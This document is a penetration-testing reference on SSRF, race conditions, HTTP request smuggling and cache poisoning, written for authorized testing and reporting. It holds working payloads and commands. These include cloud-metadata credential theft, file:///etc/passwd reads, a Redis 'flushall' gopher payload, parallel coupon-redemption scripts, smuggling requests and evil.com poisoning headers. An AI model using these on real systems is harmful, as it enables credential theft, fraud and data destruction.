# Server-Side Vulnerabilities Reference

## Covers: SSRF, Race Conditions, HTTP Request Smuggling, Cache Poisoning

---

## 1. Testing Checklist

### SSRF (Server-Side Request Forgery)
1. Identify all parameters that accept URLs: webhooks, image URLs, PDF generators, import features, link previews
2. Test with Burp Collaborator / interactsh: `http://COLLAB_ID.oastify.com`
3. Test cloud metadata endpoints: `http://169.254.169.254/latest/meta-data/`
4. Test internal network scanning: `http://127.0.0.1:PORT`, `http://10.0.0.1`, `http://192.168.1.1`
5. Test protocol handlers: `file:///etc/passwd`, `gopher://`, `dict://`, `ftp://`
6. Check for blind SSRF via timing differences or DNS resolution
7. Test URL parsing differentials between validation and fetch
8. Check PDF/image generation features (wkhtmltopdf, Puppeteer)
9. Test SVG upload with external entity references
10. Check redirect-based SSRF: your server returns 302 -> internal target

### Race Conditions
1. Identify state-changing operations: payments, transfers, votes, likes, coupon redemptions
2. Test with parallel requests using Turbo Intruder or curl parallel
3. Look for TOCTOU (Time of Check to Time of Use) patterns
4. Test limit-based operations: "one coupon per user", "one free trial", "limited stock"
5. Test concurrent session operations: simultaneous password changes, concurrent logins
6. Look for race windows in multi-step flows: add to cart -> checkout -> payment
7. Test database operations that should be atomic but aren't
8. Use single-packet attack technique for sub-millisecond race windows

### HTTP Request Smuggling
1. Determine frontend/backend configuration (CDN, reverse proxy, load balancer)
2. Test CL.TE: send `Transfer-Encoding: chunked` with conflicting `Content-Length`
3. Test TE.CL: send `Content-Length` that conflicts with chunked encoding
4. Test TE.TE: obfuscated Transfer-Encoding header variations
5. Use HTTP Request Smuggler Burp extension for automated detection
6. Test H2.CL and H2.TE (HTTP/2 downgrade smuggling)
7. Check for response queue poisoning
8. Look for request splitting via header injection (CRLF in headers)

### Cache Poisoning
1. Identify cacheable endpoints (check `Cache-Control`, `Age`, `X-Cache` headers)
2. Find unkeyed inputs: headers not included in cache key but reflected in response
3. Test common unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`
4. Test parameter cloaking: `utm_content`, `callback` params that might be unkeyed
5. Check for fat GET requests (body on GET requests processed but not cached-keyed)
6. Test cache key normalization differences
7. Verify poison sticks: send payload, then request without payload and check if cached
8. Test web cache deception: trick victim into visiting `/profile.css` (cached, contains PII)

---

## 2. Tool Commands

### SSRF
```bash
# interactsh for OOB detection
interactsh-client -v

# Test internal ports
for port in 80 443 8080 8443 3000 5000 6379 27017 5432 3306 9200 11211; do
  echo "Port $port:"
  curl -s -o /dev/null -w "%{http_code} %{time_total}s" \
    "https://target.com/api/fetch?url=http://127.0.0.1:$port/"
  echo
done

# Test cloud metadata
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# SSRF via redirect
# Host this on your server:
# <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
curl "https://target.com/api/fetch?url=http://your-server.com/redirect.php"
```

### Race Conditions
```bash
# Turbo Intruder (Burp extension) - best tool, supports single-packet attack
# Use the race-single-packet-attack.py template

# curl parallel execution
seq 1 20 | xargs -P 20 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST "https://target.com/api/redeem-coupon" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon": "ONETIME50"}'

# Python script for precise timing
python3 -c "
import asyncio, aiohttp
async def race():
    async with aiohttp.ClientSession() as s:
        tasks = [s.post('https://target.com/api/redeem',
                 headers={'Authorization':'Bearer TOKEN'},
                 json={'code':'COUPON'}) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        for r in results: print(r.status, await r.text())
asyncio.run(race())
"
```

### HTTP Request Smuggling
```bash
# smuggler.py
python3 smuggler.py -u https://target.com

# HTTP Request Smuggler (Burp extension) - use "Smuggle Probe" scanner

# Manual CL.TE test
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | openssl s_client -connect target.com:443 -quiet

# h2csmuggler (HTTP/2 cleartext smuggling)
python3 h2csmuggler.py -x https://target.com/ --test

# Manual H2 smuggling via Burp Repeater (enable HTTP/2, disable content-length updates)
```

### Cache Poisoning
```bash
# Param Miner (Burp extension) - automated unkeyed input discovery
# Use "Guess headers" and "Guess params" functions

# Manual unkeyed header test
curl -s -D- "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com\|cache"

# Test common unkeyed headers
for header in "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto" "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Port"; do
  echo "=== $header ==="
  curl -s "https://target.com/" -H "$header: evil.com" | grep -i "evil"
done

# Web cache deception test
# As victim, visit: https://target.com/account/settings/nonexistent.css
# As attacker, visit same URL and check if victim's data is cached
curl -s "https://target.com/account/settings/nonexistent.css" -H "Cookie: " | grep -i "email\|name\|account"
```

---

## 3. Payloads

### SSRF - Internal Network
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1          # Octal
http://2130706433           # Decimal
http://0x7f000001           # Hex
http://127.1                # Short form
http://127.0.0.1.nip.io    # DNS rebinding
http://spoofed.burpcollaborator.net  # Rebinding service
http://localtest.me         # Resolves to 127.0.0.1
```

### SSRF - Cloud Metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

# AWS IMDSv2 (requires header, but SSRF from within instance can add it)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: $TOKEN"

# GCP
http://169.254.169.254/computeMetadata/v1/ (requires header Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires header Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### SSRF - Protocol Abuse
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a   # Redis
dict://127.0.0.1:11211/stats                                 # Memcached
```

### SSRF - Filter Bypass
```
# URL encoding
http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31

# Double URL encoding
http://127.0.0.1 -> http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31

# DNS rebinding
# Use a service that alternates between your IP and 127.0.0.1
# rbndr.us, rebinder.it

# Redirect bypass
http://your-server.com/redirect -> 302 to http://169.254.169.254/

# URL parsing confusion
http://evil.com@169.254.169.254
http://169.254.169.254#@evil.com
http://169.254.169.254%23@allowed.com
http://allowed.com@169.254.169.254

# IPv6 embedding
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### HTTP Smuggling - CL.TE
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### HTTP Smuggling - TE.CL
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### HTTP Smuggling - TE.TE (Obfuscation)
```
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```

### Cache Poisoning Headers
```
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Port: 443
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Method-Override: POST
```

---

## 4. Bypass Techniques

### SSRF Filter Bypass
- **Allowlist bypass**: Find open redirect on allowed domain, redirect to internal
- **DNS rebinding**: Register domain that alternates between your IP and 127.0.0.1
- **IP representation**: Decimal, hex, octal, IPv6, shortened forms
- **URL parser differential**: Different parsing between validation and request library
- **CNAME to internal**: Point your domain's CNAME to internal hostname
- **Protocol switching**: If `http://` blocked, try `gopher://`, `file://`, `dict://`
- **Redirect chain**: Your server 302 -> internal target (often bypasses URL validation)
- **Post-validation redirect**: URL validates as external, but server follows redirect to internal
- **DNS pinning bypass**: First resolution = allowed IP, subsequent = internal IP
- **Fragment bypass**: `http://allowed.com#@169.254.169.254`
- **Backslash trick**: `http://allowed.com\@169.254.169.254` (some parsers)

### Race Condition Optimization
- **Single-packet attack**: Send all requests in one TCP packet so they arrive simultaneously
- **Connection warming**: Pre-establish connections to eliminate TCP handshake variance
- **Last-byte sync**: Hold all requests except last byte, then send final byte simultaneously
- **HTTP/2 single connection**: Multiplex all race requests over one H2 connection

### Smuggling Bypass
- **TE header obfuscation**: Tabs, spaces, capitalization, extra headers
- **HTTP/2 downgrade**: H2 -> H1.1 translation can introduce smuggling vectors
- **WebSocket upgrade smuggling**: Fake WebSocket upgrade to smuggle requests

### Cache Poisoning Stealth
- **Target specific pages**: Poison login page, JS files, or high-traffic pages
- **Use Vary header awareness**: Ensure your poisoned response matches victim's cache key
- **Time attacks**: Poison right before cache expires for maximum persistence

---

## 5. Impact Escalation

### SSRF
- Read cloud credentials from metadata -> full AWS/GCP/Azure account compromise
- Scan internal network -> discover internal services
- Access internal APIs (no auth on internal network) -> data exfil / admin actions
- Read internal files via `file://` protocol
- Chain with known CVEs on internal services (Redis, Elasticsearch, etc.)
- Port scan internal network to map infrastructure

### Race Conditions
- Redeem coupons/vouchers multiple times -> financial loss
- Double-spend / overdraw account balance
- Bypass "one per user" limits
- Win auctions unfairly
- Create multiple resources that should be unique

### HTTP Request Smuggling
- Capture other users' requests (credentials, cookies)
- Bypass security controls (WAF, access restrictions)
- Cache poisoning via smuggled response
- Request routing to different backends
- Credential theft from other users' requests

### Cache Poisoning
- Serve malicious JavaScript to all visitors (mass XSS)
- Redirect all visitors to phishing page
- Serve different content to specific users
- Denial of service via cached error responses
- Web cache deception: steal authenticated users' private data

---

## 6. Chain Opportunities

| Found This | Look For |
|---|---|
| SSRF (blind) | DNS exfil, try different protocols (gopher for Redis RCE) |
| SSRF to metadata | Cloud credentials -> S3 bucket access, EC2 control |
| SSRF to internal | Internal admin panels without auth, databases, caches |
| Race condition | Business logic flaws, financial impact calculations |
| Smuggling | Cache poisoning, credential theft, WAF bypass for other vulns |
| Cache poisoning | Chain with XSS payload for persistent mass exploitation |
| Open redirect | Use as SSRF bypass (redirect to internal) |
| Web cache deception | Steal CSRF tokens, API keys, PII from cached pages |

---

## 7. Common False Positives

- **SSRF**: Server returns generic error for all URLs (connection timeout != successful internal access)
- **SSRF**: DNS resolution without actual HTTP request (DNS-only SSRF may have limited impact)
- **SSRF**: Application fetches URL but response is not returned or accessible
- **Race condition**: Getting duplicate results because the server is idempotent (same result, no extra state change)
- **Race condition**: Apparent double-processing that's actually handled by idempotency keys
- **Smuggling**: Different response lengths that are due to normal server behavior, not smuggling
- **Cache poisoning**: Header reflected in response but response is not actually cached (check `Age`, `X-Cache` headers)
- **Cache poisoning**: Response cached but only for your session (private cache)

---

## 8. Report Snippets

### SSRF
> The `[parameter]` at `[endpoint]` allows server-side requests to arbitrary destinations. By supplying an internal URL, I accessed the AWS metadata endpoint at `169.254.169.254` and retrieved IAM credentials for the role `[role_name]`. These temporary credentials provide [specific access: S3 read/write, EC2 management, etc.], compromising the cloud infrastructure.

### Race Condition
> The `[endpoint]` is vulnerable to a race condition that allows [specific bypass: multiple coupon redemptions / double spending / exceeding limits]. By sending [N] concurrent requests, I was able to [specific outcome, e.g., "redeem a one-time 50% discount coupon 8 times, resulting in $X of unauthorized discounts"]. The application lacks proper mutex/locking on the [resource].

### HTTP Request Smuggling
> The frontend (`[CDN/proxy]`) and backend server disagree on request boundary parsing, enabling CL.TE request smuggling. By sending a specially crafted request, I was able to [specific impact: poison the cache / capture other users' requests / bypass WAF rules]. This affects all users whose requests are processed by the same backend connection.

### Cache Poisoning
> The `[header]` is processed by the application but not included in the cache key, enabling cache poisoning. By sending a request with `[header]: [payload]`, the malicious response is cached and served to all subsequent visitors. I confirmed this by injecting [XSS payload / redirect] that persisted in the cache for [duration], affecting all users visiting `[URL]`.
